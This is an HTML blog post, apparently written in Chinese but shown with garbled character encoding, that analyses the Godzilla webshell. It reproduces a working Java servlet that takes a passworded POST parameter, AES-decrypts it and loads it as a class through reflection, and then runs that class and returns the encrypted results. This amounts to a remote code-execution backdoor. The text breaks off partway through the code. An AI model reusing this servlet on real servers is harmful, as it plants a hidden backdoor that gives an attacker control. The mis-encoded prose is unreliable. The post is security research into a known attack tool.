<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>å“¥æ–¯æ‹‰åŸç†åˆ†æ | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="åˆ†æèƒŒæ™¯èµ·æºäºY4erå¸ˆå‚…å‘çš„ä¸¤ç¯‡æ–‡ç« ï¼š

Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°
è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜

å¯¹å…¶ä¸­çš„åŸå› æ¯”è¾ƒå¥½å¥‡ï¼Œæ‰€ä»¥å°è¯•å¯¹å“¥æ–¯æ‹‰åšäº†ä¸€æ¬¡åŸç†åˆ†æï¼Œæµ‹è¯•ä»£ç åœ¨MemoryShellDemoã€‚æ–‡ç« å¯èƒ½æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨issueç•™è¨€ã€‚
è¿è¡ŒåŸç†ä»å“¥æ–¯æ‹‰çš„æºä»£ç é‡Œé¢æ‰£å‡ºæ¥godzilla\shells\payloads\java\assets\payload.classsæ–‡ä»¶ï¼Œä½¿ç”¨https://github.com/leibnitz27/cfråç¼–è¯‘ä¹‹åï¼Œåœ¨ideaé‡Œé¢æ–°å»ºpayload.javaæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹è¯¯æŠ¥é”™ï¼Œè¿™é‡Œæ˜¯åç¼–è¯‘å¥½ä¹‹åçš„æ–‡ä»¶ã€‚payload.javaå®ç°äº†å¤§éƒ¨åˆ†çš„shellæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€æ•°æ®åº“è¿æ¥ç­‰ç­‰
æ–°å»ºä¸€ä¸ªHelloServlet.javaï¼Œç”¨äºåŠ¨æ€è°ƒè¯•ï¼š
package basic;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

@WebServlet(name = &#34;helloServlet&#34;, value = &#34;/hello&#34;)
public class HelloServlet extends HttpServlet &amp;#123;
    String xc = &#34;3c6e0b8a9c15224a&#34;;  //å®šä¹‰AESåŠ è§£å¯†çš„Keyï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠè¿”å›çš„responseä¹Ÿåšä¸€æ¬¡åŠ å¯†
    String pass = &#34;pass&#34;;       
    String md5 = md5(pass + xc);   //ç”¨äºè¿”å›responseåœ¨å¤´å’Œå°¾éƒ¨æ’å…¥æ ‡è¯†ç¬¦ï¼Œå¤´éƒ¨å–md5çš„å‰16ä½å­—ç¬¦ä¸²ï¼Œå°¾éƒ¨å–md5çš„å16ä½å­—ç¬¦ä¸²
    Class payload;

    public static String md5(String s) &amp;#123;
        String ret = null;
        try &amp;#123;
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance(&#34;MD5&#34;);
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        &amp;#125; catch (Exception e) &amp;#123;
        &amp;#125;
        return ret;
    &amp;#125;

    public static String base64Encode(byte[] bs) throws Exception &amp;#123;
        Class base64;
        String value = null;
        try &amp;#123;
            base64 = Class.forName(&#34;java.util.Base64&#34;);
            Object Encoder = base64.getMethod(&#34;getEncoder&#34;, null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod(&#34;encodeToString&#34;, new Class[]&amp;#123;byte[].class&amp;#125;).invoke(Encoder, new Object[]&amp;#123;bs&amp;#125;);
        &amp;#125; catch (Exception e) &amp;#123;
            try &amp;#123;
                base64 = Class.forName(&#34;sun.misc.BASE64Encoder&#34;);
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod(&#34;encode&#34;, new Class[]&amp;#123;byte[].class&amp;#125;).invoke(Encoder, new Object[]&amp;#123;bs&amp;#125;);
            &amp;#125; catch (Exception e2) &amp;#123;
            &amp;#125;
        &amp;#125;
        return value;
    &amp;#125;

    public static byte[] base64Decode(String bs) throws Exception &amp;#123;
        Class base64;
        byte[] value = null;
        try &amp;#123;
            base64 = Class.forName(&#34;java.util.Base64&#34;);
            Object decoder = base64.getMethod(&#34;getDecoder&#34;, null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod(&#34;decode&#34;, new Class[]&amp;#123;String.class&amp;#125;).invoke(decoder, new Object[]&amp;#123;bs&amp;#125;);
        &amp;#125; catch (Exception e) &amp;#123;
            try &amp;#123;
                base64 = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod(&#34;decodeBuffer&#34;, new Class[]&amp;#123;String.class&amp;#125;).invoke(decoder, new Object[]&amp;#123;bs&amp;#125;);
            &amp;#125; catch (Exception e2) &amp;#123;
            &amp;#125;
        &amp;#125;
        return value;
    &amp;#125;

    public byte[] x(byte[] s, boolean m) &amp;#123;  
        try &amp;#123;
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&#34;AES&#34;);
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &#34;AES&#34;)); //æ ¹æ®mçš„å€¼åˆ¤æ–­æ˜¯åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼Œmæ˜¯trueçš„æ—¶å€™å˜é‡ä¸º1ï¼Œè¿™æ—¶å€™è¡¨ç¤ºåŠ å¯†æ¨¡å¼ï¼Œåä¹‹æ˜¯è§£å¯†æ¨¡å¼
            return c.doFinal(s);
        &amp;#125; catch (Exception e) &amp;#123;
            return null;
        &amp;#125;
    &amp;#125;

    public Class defClass(byte[] classBytes) throws Throwable &amp;#123;
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;, byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    &amp;#125;

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &amp;#123;
        try &amp;#123;
            byte[] data = base64Decode(req.getParameter(pass));
            data = x(data, false);
            if (payload == null) &amp;#123;  
                payload = defClass(data);  //ç”¨äºç¬¬ä¸€æ¬¡æ¥å—è¯·æ±‚åˆå§‹åŒ–payload
            &amp;#125; else &amp;#123;
                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                resp.getWriter().write(String.valueOf(arrOut));
                resp.getWriter().write(&#34;\n&#34;);
//                Object f = payload.newInstance(); 
                Object f = ((Class) Class.forName(&#34;basic.payload&#34;)).newInstance(); //æœ¬åœ°åŠ è½½payloadï¼Œç”¨äºåŠ¨æ€è°ƒè¯•
                f.equals(arrOut);
                f.equals(data);
                f.equals(req);
                resp.getWriter().write(md5.substring(0, 16));
                f.toString();
                resp.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                resp.getWriter().write(md5.substring(16));
            &amp;#125;
        &amp;#125; catch (Throwable e) &amp;#123;
        &amp;#125;
    &amp;#125;
&amp;#125;
åœ¨å“¥æ–¯æ‹‰ä¸»ç•Œé¢ï¼Œç‚¹å‡»æµ‹è¯•ä¼šåœ¨burpå‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç„¶åå“¥æ–¯æ‹‰ä¼šå¼¹æ¡†å‡ºç°Successï¼Œè¿™æ—¶å€™å†ç‚¹å‡»ç¡®å®šï¼Œå“¥æ–¯æ‹‰ä¼šå‘èµ·ç¬¬ä¸‰æ¬¡è¯·æ±‚ï¼Œå…ˆåˆ†æè¿™ä¸‰æ¬¡è¯·æ±‚çš„æ•°æ®åŒ…ä»¥åŠå“¥æ–¯æ‹‰éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚
ç¬¬ä¸€æ¬¡è¯·æ±‚"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="å“¥æ–¯æ‹‰åŸç†åˆ†æ"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> å“¥æ–¯æ‹‰åŸç†åˆ†æ</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="åˆ†æèƒŒæ™¯"><a href="#åˆ†æèƒŒæ™¯" class="headerlink" title="åˆ†æèƒŒæ™¯"></a>åˆ†æèƒŒæ™¯</h2><p>èµ·æºäº<code>Y4er</code>å¸ˆå‚…å‘çš„ä¸¤ç¯‡æ–‡ç« ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1513/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li>
<li><a target="_blank" rel="noopener" href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></li>
</ul>
<p>å¯¹å…¶ä¸­çš„åŸå› æ¯”è¾ƒå¥½å¥‡ï¼Œæ‰€ä»¥å°è¯•å¯¹å“¥æ–¯æ‹‰åšäº†ä¸€æ¬¡åŸç†åˆ†æï¼Œæµ‹è¯•ä»£ç åœ¨<a target="_blank" rel="noopener" href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>ã€‚æ–‡ç« å¯èƒ½æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨<a target="_blank" rel="noopener" href="https://github.com/JKme/JKme.github.io/issues">issue</a>ç•™è¨€ã€‚</p>
<h2 id="è¿è¡ŒåŸç†"><a href="#è¿è¡ŒåŸç†" class="headerlink" title="è¿è¡ŒåŸç†"></a>è¿è¡ŒåŸç†</h2><p>ä»å“¥æ–¯æ‹‰çš„æºä»£ç é‡Œé¢æ‰£å‡ºæ¥<code>godzilla\shells\payloads\java\assets\payload.classs</code>æ–‡ä»¶ï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>åç¼–è¯‘ä¹‹åï¼Œåœ¨ideaé‡Œé¢æ–°å»º<code>payload.java</code>æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹è¯¯æŠ¥é”™ï¼Œ<a target="_blank" rel="noopener" href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">è¿™é‡Œ</a>æ˜¯åç¼–è¯‘å¥½ä¹‹åçš„æ–‡ä»¶ã€‚<code>payload.java</code>å®ç°äº†å¤§éƒ¨åˆ†çš„shellæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€æ•°æ®åº“è¿æ¥ç­‰ç­‰</p>
<p>æ–°å»ºä¸€ä¸ª<code>HelloServlet.java</code>ï¼Œç”¨äºåŠ¨æ€è°ƒè¯•ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//å®šä¹‰AESåŠ è§£å¯†çš„Keyï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠè¿”å›çš„responseä¹Ÿåšä¸€æ¬¡åŠ å¯†</span>
    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>       
    <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//ç”¨äºè¿”å›responseåœ¨å¤´å’Œå°¾éƒ¨æ’å…¥æ ‡è¯†ç¬¦ï¼Œå¤´éƒ¨å–md5çš„å‰16ä½å­—ç¬¦ä¸²ï¼Œå°¾éƒ¨å–md5çš„å16ä½å­—ç¬¦ä¸²</span>
    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>
            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ ¹æ®mçš„å€¼åˆ¤æ–­æ˜¯åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼Œmæ˜¯trueçš„æ—¶å€™å˜é‡ä¸º1ï¼Œè¿™æ—¶å€™è¡¨ç¤ºåŠ å¯†æ¨¡å¼ï¼Œåä¹‹æ˜¯è§£å¯†æ¨¡å¼</span>
